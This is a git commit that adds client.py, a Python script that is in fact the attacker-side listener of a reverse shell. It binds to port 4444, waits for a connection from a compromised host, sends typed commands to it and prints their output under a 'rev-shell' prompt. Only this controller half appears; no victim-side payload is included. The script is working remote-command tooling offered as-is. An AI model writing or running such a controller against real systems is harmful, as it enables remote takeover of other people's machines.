ac980c552287dc649b25ce331c0380dc91de26d8
4m4Sec <52249849+4m4Sec@users.noreply.github.com>
2023-01-20 10:58:06 +0100

    Add files via upload

---
+++ client.py
@@ -0,0 +1,33 @@
+#!/usr/bin/python3
+
+import socket
+
+SERVER_HOST = "127.0.0.1"
+SERVER_PORT = 4444
+
+BUFFER_SIZE = 1024 * 128
+SEPARATOR = "<sep>"
+
+s = socket.socket()
+s.bind((SERVER_HOST, SERVER_PORT))
+s.listen(5)
+
+print(f"Listening on [{SERVER_HOST}] {SERVER_PORT} ...")
+
+client_socket, client_address = s.accept()
+print(f"{client_address[0]} {client_address[1]} connected!")
+
+cwd = client_socket.recv(BUFFER_SIZE).decode()
+
+while True:
+    print(" ")
+    command = input(f"""┌─[rev-shell@{SERVER_HOST}]─[~{cwd}]\n└──╼ $ """)
+    
+    if not command.strip(): continue
+    client_socket.send(command.encode())
+    
+    if command.lower() == "exit": break
+
+    output = client_socket.recv(BUFFER_SIZE).decode()
+    results, cwd = output.split(SEPARATOR)
+    print(results)
